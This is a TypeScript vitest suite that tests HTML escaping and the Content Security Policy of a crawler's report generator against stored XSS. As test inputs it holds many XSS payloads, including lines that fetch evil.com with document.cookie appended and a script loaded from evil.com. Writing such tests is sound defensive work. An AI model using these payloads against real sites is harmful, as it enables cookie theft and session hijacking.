/**
 * XSS Prevention Tests for HTML Report Generation
 *
 * Validates that all untrusted data from target sites is properly
 * HTML-entity-encoded before being embedded in the HTML report, and that
 * the report includes defensive CSP headers.
 *
 * Threat reference: T3.3 (Stored XSS in HTML Reports)
 */

import { describe, it, expect } from 'vitest';

// The modules under test
// src/report/html/escape.ts -- HTML entity encoding
// src/report/html/template.ts -- HTML report template with CSP
// src/security/output-sanitizer.ts -- output escaping utilities
import { escapeHtml } from '../../src/report/html/escape.js';

// Template that generates the full HTML report shell
import { generateReportHtml } from '../../src/report/html/template.js';

// ===========================================================================
// 1. escapeHtml() unit tests -- the core defense
// ===========================================================================
describe('XSS Prevention - escapeHtml()', () => {
  // -----------------------------------------------------------------------
  // Basic entity encoding
  // -----------------------------------------------------------------------
  it('escapes < to &lt;', () => {
    expect(escapeHtml('<')).toBe('&lt;');
  });

  it('escapes > to &gt;', () => {
    expect(escapeHtml('>')).toBe('&gt;');
  });

  it('escapes & to &amp;', () => {
    expect(escapeHtml('&')).toBe('&amp;');
  });

  it('escapes " to &quot;', () => {
    expect(escapeHtml('"')).toBe('&quot;');
  });

  it("escapes ' to &#039;", () => {
    expect(escapeHtml("'")).toBe('&#039;');
  });

  // -----------------------------------------------------------------------
  // <script> tag injection in page titles
  // -----------------------------------------------------------------------
  describe('script tag injection in page titles', () => {
    it('neutralizes <script>alert(1)</script>', () => {
      const input = '<script>alert(1)</script>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('</script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('neutralizes <script src="evil.js"></script>', () => {
      const input = '<script src="https://evil.com/steal.js"></script>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<script');
      expect(escaped).toContain('&lt;script');
    });

    it('neutralizes <SCRIPT> (case variation)', () => {
      const input = '<SCRIPT>alert(document.cookie)</SCRIPT>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<SCRIPT>');
      expect(escaped).toContain('&lt;SCRIPT&gt;');
    });

    it('neutralizes <scr<script>ipt> (nested tag bypass)', () => {
      const input = '<scr<script>ipt>alert(1)</scr</script>ipt>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<script>');
    });
  });

  // -----------------------------------------------------------------------
  // Event handler injection in form field names
  // -----------------------------------------------------------------------
  describe('event handler injection in form field names', () => {
    it('neutralizes onload handler', () => {
      const input = '" onload="alert(1)"';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('"');
      expect(escaped).toContain('&quot;');
    });

    it('neutralizes onerror handler', () => {
      const input = '<img src=x onerror=alert(1)>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
    });

    it('neutralizes onmouseover handler', () => {
      const input = '" onmouseover="fetch(\'https://evil.com/\'+document.cookie)"';
      const escaped = escapeHtml(input);
      // The attribute-breaking quote must be escaped, preventing attribute injection
      expect(escaped.startsWith('&quot;')).toBe(true);
      // The raw " that would break out of an attribute context is escaped
      expect(escaped).not.toContain('" onmouseover=');
    });

    it('neutralizes onfocus handler with autofocus', () => {
      const input = '<input onfocus=alert(1) autofocus>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<input');
    });

    it('neutralizes onclick handler', () => {
      const input = '" onclick="alert(1)"';
      const escaped = escapeHtml(input);
      expect(escaped).toContain('&quot;');
    });
  });

  // -----------------------------------------------------------------------
  // JavaScript: URLs in href attributes
  // -----------------------------------------------------------------------
  describe('javascript: URL injection', () => {
    it('neutralizes javascript: protocol in href', () => {
      const input = 'javascript:alert(document.cookie)';
      const escaped = escapeHtml(input);
      // escapeHtml handles entity encoding; the report template should
      // additionally validate href values. But at minimum, if this is used
      // in an attribute context with proper quoting, it should be safe.
      expect(escaped).toBe('javascript:alert(document.cookie)');
      // Note: javascript: URLs must be caught by the template layer
      // (href validation), not just entity encoding
    });

    it('neutralizes javascript: with HTML entities in surrounding context', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<a');
      expect(escaped).toContain('&lt;a');
    });

    it('neutralizes javascript: with case variation', () => {
      const input = '<a href="JaVaScRiPt:alert(1)">Click</a>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<a');
    });

    it('neutralizes javascript: with whitespace', () => {
      const input = '<a href="java\nscript:alert(1)">Click</a>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<a');
    });
  });

  // -----------------------------------------------------------------------
  // SVG-based XSS
  // -----------------------------------------------------------------------
  describe('SVG-based XSS', () => {
    it('neutralizes SVG with onload', () => {
      const input = '<svg onload="alert(1)">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<svg');
      expect(escaped).toContain('&lt;svg');
    });

    it('neutralizes SVG with embedded script', () => {
      const input =
        '<svg><script>alert(1)</script></svg>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<svg>');
      expect(escaped).not.toContain('<script>');
    });

    it('neutralizes SVG with animate and xlink', () => {
      const input =
        '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<svg>');
      expect(escaped).not.toContain('<animate');
    });

    it('neutralizes SVG with foreignObject', () => {
      const input =
        '<svg><foreignObject><body onload="alert(1)"></body></foreignObject></svg>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<svg>');
      expect(escaped).not.toContain('<foreignObject>');
    });
  });

  // -----------------------------------------------------------------------
  // CSS expression injection
  // -----------------------------------------------------------------------
  describe('CSS expression injection', () => {
    it('neutralizes style tag with expression', () => {
      const input = '<style>body { background: expression(alert(1)) }</style>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<style>');
    });

    it('neutralizes inline style with expression', () => {
      const input = '<div style="width: expression(alert(1))">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<div');
    });

    it('neutralizes style with url() pointing to javascript', () => {
      const input =
        '<div style="background: url(javascript:alert(1))">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<div');
    });

    it('neutralizes -moz-binding CSS injection', () => {
      const input = '<div style="-moz-binding: url(evil.xml#xss)">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<div');
    });
  });

  // -----------------------------------------------------------------------
  // Template injection (${...})
  // -----------------------------------------------------------------------
  describe('template literal injection', () => {
    it('preserves ${...} as literal text (no execution)', () => {
      const input = '${document.cookie}';
      const escaped = escapeHtml(input);
      // Template literals are not a concern for HTML entity encoding,
      // but we verify they pass through unchanged (no expansion)
      expect(escaped).toBe('${document.cookie}');
    });

    it('handles backtick-wrapped template expressions', () => {
      const input = '`${alert(1)}`';
      const escaped = escapeHtml(input);
      expect(escaped).toBe('`${alert(1)}`');
    });

    it('neutralizes template injection inside HTML context', () => {
      const input = '<div>${fetch("https://evil.com/"+document.cookie)}</div>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<div>');
      expect(escaped).toContain('&lt;div&gt;');
    });
  });

  // -----------------------------------------------------------------------
  // Encoded entities that decode to XSS
  // -----------------------------------------------------------------------
  describe('encoded entity bypass attempts', () => {
    it('handles &lt;script&gt; (already-encoded -- no double-encoding issue)', () => {
      const input = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const escaped = escapeHtml(input);
      // & gets encoded to &amp; so it becomes &amp;lt;script&amp;gt;
      // This is safe -- it renders as literal "&lt;script&gt;"
      expect(escaped).toContain('&amp;lt;');
      expect(escaped).not.toContain('<script>');
    });

    it('handles HTML numeric entities &#60; (< as decimal)', () => {
      const input = '&#60;script&#62;alert(1)&#60;/script&#62;';
      const escaped = escapeHtml(input);
      // &#60; contains & which gets encoded
      expect(escaped).toContain('&amp;#60;');
    });

    it('handles hex entities &#x3C; (< as hex)', () => {
      const input = '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;';
      const escaped = escapeHtml(input);
      expect(escaped).toContain('&amp;#x3C;');
    });
  });

  // -----------------------------------------------------------------------
  // Data from API responses containing XSS payloads
  // -----------------------------------------------------------------------
  describe('API response data with XSS payloads', () => {
    it('escapes XSS in JSON response body displayed in report', () => {
      const apiResponse = '{"name":"<script>alert(1)</script>","id":1}';
      const escaped = escapeHtml(apiResponse);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes XSS in API endpoint URL', () => {
      const endpoint = '/api/search?q=<script>alert(1)</script>';
      const escaped = escapeHtml(endpoint);
      expect(escaped).not.toContain('<script>');
    });

    it('escapes XSS in response header value', () => {
      const header = 'text/html; <script>alert(1)</script>';
      const escaped = escapeHtml(header);
      expect(escaped).not.toContain('<script>');
    });
  });

  // -----------------------------------------------------------------------
  // Form validation messages with HTML
  // -----------------------------------------------------------------------
  describe('form validation messages with HTML', () => {
    it('escapes HTML in validation message text', () => {
      const message = 'Please enter a valid <b>email</b> address';
      const escaped = escapeHtml(message);
      expect(escaped).not.toContain('<b>');
      expect(escaped).toContain('&lt;b&gt;');
    });

    it('escapes XSS in custom validation message', () => {
      const message = '<img src=x onerror=alert(1)> is required';
      const escaped = escapeHtml(message);
      expect(escaped).not.toContain('<img');
    });

    it('escapes XSS in placeholder text', () => {
      const placeholder = '"><script>alert(1)</script>';
      const escaped = escapeHtml(placeholder);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&quot;');
    });
  });

  // -----------------------------------------------------------------------
  // URL parameters with XSS payloads
  // -----------------------------------------------------------------------
  describe('URL parameters with XSS payloads', () => {
    it('escapes XSS in query parameter values', () => {
      const url = '/search?q=<script>alert(1)</script>&page=1';
      const escaped = escapeHtml(url);
      expect(escaped).not.toContain('<script>');
    });

    it('escapes XSS in fragment identifiers', () => {
      const url = '/page#<img/src=x onerror=alert(1)>';
      const escaped = escapeHtml(url);
      expect(escaped).not.toContain('<img');
    });

    it('escapes XSS in path segments', () => {
      const url = '/api/<script>/data';
      const escaped = escapeHtml(url);
      expect(escaped).not.toContain('<script>');
    });
  });

  // -----------------------------------------------------------------------
  // Edge cases
  // -----------------------------------------------------------------------
  describe('edge cases', () => {
    it('handles empty string', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('handles string with no special characters', () => {
      const input = 'Hello World 123';
      expect(escapeHtml(input)).toBe('Hello World 123');
    });

    it('handles multiple special characters in sequence', () => {
      const input = '<>&"\'';
      expect(escapeHtml(input)).toBe('&lt;&gt;&amp;&quot;&#039;');
    });

    it('handles very long strings without truncation', () => {
      const input = '<script>'.repeat(1000);
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
      // Verify all 1000 occurrences were escaped
      const count = (escaped.match(/&lt;script&gt;/g) || []).length;
      expect(count).toBe(1000);
    });

    it('handles null bytes in input', () => {
      const input = '<script\0>alert(1)</script>';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<script');
    });

    it('handles unicode characters correctly', () => {
      const input = 'Cafe\u0301 <script>alert(1)</script>';
      const escaped = escapeHtml(input);
      expect(escaped).toContain('Cafe\u0301');
      expect(escaped).not.toContain('<script>');
    });
  });
});

// ===========================================================================
// 2. HTML Report Template Security
// ===========================================================================
describe('XSS Prevention - HTML Report Template', () => {
  // -----------------------------------------------------------------------
  // CSP meta tag
  // -----------------------------------------------------------------------
  describe('Content Security Policy', () => {
    it('includes CSP meta tag in generated report', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      expect(html).toContain('Content-Security-Policy');
    });

    it('CSP blocks external resource loading', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      // CSP should prevent network requests from the report
      expect(html).toMatch(/default-src\s+'none'/);
    });

    it('CSP allows inline styles (needed for report rendering)', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      expect(html).toMatch(/style-src\s+'unsafe-inline'/);
    });

    it('CSP restricts image sources to data: and blob:', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      expect(html).toMatch(/img-src\s+data:\s+blob:/);
    });
  });

  // -----------------------------------------------------------------------
  // Verify XSS payloads in data are escaped in output
  // -----------------------------------------------------------------------
  describe('data escaping in report output', () => {
    it('escapes XSS in page title', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [
          {
            url: 'https://example.com/',
            title: '<script>alert("XSS")</script>',
            status: 200,
          },
        ],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 1,
        errors: 0,
      });

      expect(html).not.toContain('<script>alert("XSS")</script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('escapes XSS in form field names', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [
          {
            url: 'https://example.com/login',
            action: '/login',
            method: 'POST',
            fields: [
              {
                name: '"><img src=x onerror=alert(1)>',
                type: 'text',
                required: false,
              },
            ],
          },
        ],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 1,
        errors: 0,
      });

      expect(html).not.toContain('<img src=x onerror=alert(1)>');
      expect(html).toContain('&lt;img');
    });

    it('escapes XSS in API endpoint URLs', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [
          {
            url: '/api/<script>alert(1)</script>',
            method: 'GET',
            status: 200,
          },
        ],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 1,
        errors: 0,
      });

      expect(html).not.toContain('<script>alert(1)</script>');
    });

    it('escapes XSS in target URL metadata', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com/<script>alert(1)</script>',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      // The target URL in the report header must be escaped
      expect(html).not.toMatch(/<script>alert\(1\)<\/script>/);
    });
  });

  // -----------------------------------------------------------------------
  // No inline event handlers in generated report
  // -----------------------------------------------------------------------
  describe('no inline event handlers', () => {
    it('report HTML does not contain onclick attributes', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      // The report's own HTML should not use inline event handlers
      // (all JS should be in <script> blocks using addEventListener)
      expect(html).not.toMatch(/\sonclick\s*=/i);
      expect(html).not.toMatch(/\sonload\s*=/i);
      expect(html).not.toMatch(/\sonerror\s*=/i);
      expect(html).not.toMatch(/\sonmouseover\s*=/i);
      expect(html).not.toMatch(/\sonfocus\s*=/i);
      expect(html).not.toMatch(/\sonsubmit\s*=/i);
    });
  });

  // -----------------------------------------------------------------------
  // HTML structure integrity
  // -----------------------------------------------------------------------
  describe('HTML structure integrity', () => {
    it('generates valid HTML5 document', () => {
      const html = generateReportHtml({
        title: 'Test Report',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      expect(html).toMatch(/<!DOCTYPE html>/i);
      expect(html).toContain('<html');
      expect(html).toContain('</html>');
      expect(html).toContain('<head>');
      expect(html).toContain('</head>');
      expect(html).toContain('<body>');
      expect(html).toContain('</body>');
    });

    it('report title in <title> tag is escaped', () => {
      const html = generateReportHtml({
        title: '</title><script>alert(1)</script>',
        targetUrl: 'https://example.com',
        pages: [],
        forms: [],
        apiEndpoints: [],
        crawlDate: new Date().toISOString(),
        duration: 0,
        pagesVisited: 0,
        errors: 0,
      });

      // Verify the title tag is not broken
      expect(html).not.toMatch(/<\/title>\s*<script>/);
    });
  });
});
